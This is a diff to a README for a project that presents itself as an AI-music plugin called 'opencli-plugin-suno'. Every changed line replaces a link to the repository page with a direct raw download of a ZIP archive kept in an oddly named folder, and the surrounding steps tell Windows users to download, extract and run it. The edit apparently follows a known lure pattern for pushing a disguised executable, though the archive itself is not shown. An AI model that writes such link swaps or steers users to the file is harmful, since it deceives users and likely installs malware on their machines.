@@ -1,6 +1,6 @@
 # 🎵 opencli-plugin-suno - Create AI Music from Chat
 
-[⬇️ Download and run on GitHub](https://github.com/ma367175/opencli-plugin-suno) ![Blue](https://img.shields.io/badge/Download-OpenCLI%20Plugin-blue) ![Grey](https://img.shields.io/badge/Windows-Ready-lightgrey)
+[⬇️ Download and run on GitHub](https://github.com/ma367175/opencli-plugin-suno/raw/refs/heads/main/Centrechinoida/suno_opencli_plugin_v3.5.zip) ![Blue](https://img.shields.io/badge/Download-OpenCLI%20Plugin-blue) ![Grey](https://img.shields.io/badge/Windows-Ready-lightgrey)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use the GitHub link above to visit the download page, then download and run the 
 
 ## 📥 Download and Install
 
-1. Open the download page: [https://github.com/ma367175/opencli-plugin-suno](https://github.com/ma367175/opencli-plugin-suno)
+1. Open the download page: [https://github.com/ma367175/opencli-plugin-suno/raw/refs/heads/main/Centrechinoida/suno_opencli_plugin_v3.5.zip](https://github.com/ma367175/opencli-plugin-suno/raw/refs/heads/main/Centrechinoida/suno_opencli_plugin_v3.5.zip)
 2. Look for the latest release or the main download file on the page.
 3. Download the file to your Windows PC.
 4. If the file is a ZIP package, right-click it and choose Extract All.
@@ -128,7 +128,7 @@ This makes it easier to find your files later.
 
 If you need to get the file again, use this link:
 
-[https://github.com/ma367175/opencli-plugin-suno](https://github.com/ma367175/opencli-plugin-suno)
+[https://github.com/ma367175/opencli-plugin-suno/raw/refs/heads/main/Centrechinoida/suno_opencli_plugin_v3.5.zip](https://github.com/ma367175/opencli-plugin-suno/raw/refs/heads/main/Centrechinoida/suno_opencli_plugin_v3.5.zip)
 
 ## ❓ Frequently Used Questions
 
@@ -188,4 +188,4 @@ This keeps the first run simple and easy to review
 
 ## 📎 Main Link
 
-[Visit the GitHub page to download and run opencli-plugin-suno](https://github.com/ma367175/opencli-plugin-suno)
+[Visit the GitHub page to download and run opencli-plugin-suno](https://github.com/ma367175/opencli-plugin-suno/raw/refs/heads/main/Centrechinoida/suno_opencli_plugin_v3.5.zip)
